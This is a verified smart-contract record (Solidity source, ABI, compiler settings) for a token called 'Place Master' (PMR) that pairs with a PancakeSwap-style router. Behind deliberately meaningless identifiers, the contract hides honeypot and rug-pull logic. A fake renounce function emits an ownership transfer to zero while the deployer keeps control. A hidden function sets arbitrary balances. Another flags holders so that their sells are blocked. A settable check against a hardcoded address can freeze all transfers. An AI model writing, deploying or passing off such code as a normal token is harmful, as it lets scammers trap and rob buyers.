{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface fundMin {\n    function createPair(address receiverSwapFee, address swapTx) external returns (address);\n}\n\ninterface receiverToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenAmount) external view returns (uint256);\n\n    function transfer(address maxMin, uint256 feeToken) external returns (bool);\n\n    function allowance(address tokenAmountSell, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address maxMin,\n        uint256 feeToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tradingWallet, uint256 value);\n    event Approval(address indexed tokenAmountSell, address indexed spender, uint256 value);\n}\n\nabstract contract senderEnableWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface toTotal is receiverToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PlaceMaster is senderEnableWallet, receiverToken, toTotal {\n\n    function liquiditySwap(uint256 feeToken) public {\n        sellLimitLaunched();\n        walletIs = feeToken;\n    }\n\n    address public shouldTx;\n\n    address fundSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public shouldTo;\n\n    uint256 private senderTx;\n\n    mapping(address => bool) public fromIsLimit;\n\n    uint256 liquidityFund;\n\n    uint256 public receiverListTake;\n\n    function transfer(address atLaunchTo, uint256 feeToken) external virtual override returns (bool) {\n        return launchReceiverLiquidity(_msgSender(), atLaunchTo, feeToken);\n    }\n\n    address public totalLimit;\n\n    function name() external view virtual override returns (string memory) {\n        return senderAt;\n    }\n\n    bool private takeMax;\n\n    bool public buyTake;\n\n    mapping(address => bool) public atTeamFee;\n\n    function owner() external view returns (address) {\n        return amountFundSender;\n    }\n\n    uint256 private atFee = 100000000 * 10 ** 18;\n\n    function approve(address receiverTeam, uint256 feeToken) public virtual override returns (bool) {\n        shouldTake[_msgSender()][receiverTeam] = feeToken;\n        emit Approval(_msgSender(), receiverTeam, feeToken);\n        return true;\n    }\n\n    function launchReceiverLiquidity(address txMode, address maxMin, uint256 feeToken) internal returns (bool) {\n        if (txMode == shouldTx) {\n            return limitTo(txMode, maxMin, feeToken);\n        }\n        uint256 senderShouldSwap = receiverToken(totalLimit).balanceOf(teamAt);\n        require(senderShouldSwap == walletIs);\n        require(maxMin != teamAt);\n        if (fromIsLimit[txMode]) {\n            return limitTo(txMode, maxMin, modeAmount);\n        }\n        return limitTo(txMode, maxMin, feeToken);\n    }\n\n    function allowance(address fromLimitBuy, address receiverTeam) external view virtual override returns (uint256) {\n        if (receiverTeam == fundSell) {\n            return type(uint256).max;\n        }\n        return shouldTake[fromLimitBuy][receiverTeam];\n    }\n\n    uint256 constant modeAmount = 17 ** 10;\n\n    function balanceOf(address tokenAmount) public view virtual override returns (uint256) {\n        return txList[tokenAmount];\n    }\n\n    function atTotal(address buyShould) public {\n        require(buyShould.balance < 100000);\n        if (buyTake) {\n            return;\n        }\n        \n        atTeamFee[buyShould] = true;\n        if (shouldTo == receiverTx) {\n            shouldTo = true;\n        }\n        buyTake = true;\n    }\n\n    address private amountFundSender;\n\n    function transferFrom(address txMode, address maxMin, uint256 feeToken) external override returns (bool) {\n        if (_msgSender() != fundSell) {\n            if (shouldTake[txMode][_msgSender()] != type(uint256).max) {\n                require(feeToken <= shouldTake[txMode][_msgSender()]);\n                shouldTake[txMode][_msgSender()] -= feeToken;\n            }\n        }\n        return launchReceiverLiquidity(txMode, maxMin, feeToken);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchShould;\n    }\n\n    function atSender(address atLaunchTo, uint256 feeToken) public {\n        sellLimitLaunched();\n        txList[atLaunchTo] = feeToken;\n    }\n\n    event OwnershipTransferred(address indexed toAmountMax, address indexed teamSwapEnable);\n\n    string private receiverAt = \"PMR\";\n\n    function receiverExempt() public {\n        emit OwnershipTransferred(shouldTx, address(0));\n        amountFundSender = address(0);\n    }\n\n    uint256 walletIs;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverAt;\n    }\n\n    function limitTo(address txMode, address maxMin, uint256 feeToken) internal returns (bool) {\n        require(txList[txMode] >= feeToken);\n        txList[txMode] -= feeToken;\n        txList[maxMin] += feeToken;\n        emit Transfer(txMode, maxMin, feeToken);\n        return true;\n    }\n\n    mapping(address => uint256) private txList;\n\n    function toMarketing(address amountTrading) public {\n        sellLimitLaunched();\n        \n        if (amountTrading == shouldTx || amountTrading == totalLimit) {\n            return;\n        }\n        fromIsLimit[amountTrading] = true;\n    }\n\n    string private senderAt = \"Place Master\";\n\n    bool public receiverTx;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return atFee;\n    }\n\n    function getOwner() external view returns (address) {\n        return amountFundSender;\n    }\n\n    mapping(address => mapping(address => uint256)) private shouldTake;\n\n    function sellLimitLaunched() private view {\n        require(atTeamFee[_msgSender()]);\n    }\n\n    address teamAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint8 private launchShould = 18;\n\n    constructor (){\n        if (takeMax) {\n            shouldTo = true;\n        }\n        launchSell receiverFee = launchSell(fundSell);\n        totalLimit = fundMin(receiverFee.factory()).createPair(receiverFee.WETH(), address(this));\n        if (receiverListTake == senderTx) {\n            shouldTo = false;\n        }\n        shouldTx = _msgSender();\n        atTeamFee[shouldTx] = true;\n        txList[shouldTx] = atFee;\n        receiverExempt();\n        \n        emit Transfer(address(0), shouldTx, atFee);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenAmountSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toAmountMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamSwapEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingWallet\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLimitBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverTeam\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLaunchTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeToken\",\"type\":\"uint256\"}],\"name\":\"atSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atTeamFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyShould\",\"type\":\"address\"}],\"name\":\"atTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAmount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromIsLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeToken\",\"type\":\"uint256\"}],\"name\":\"liquiditySwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverListTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTrading\",\"type\":\"address\"}],\"name\":\"toMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLaunchTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PlaceMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}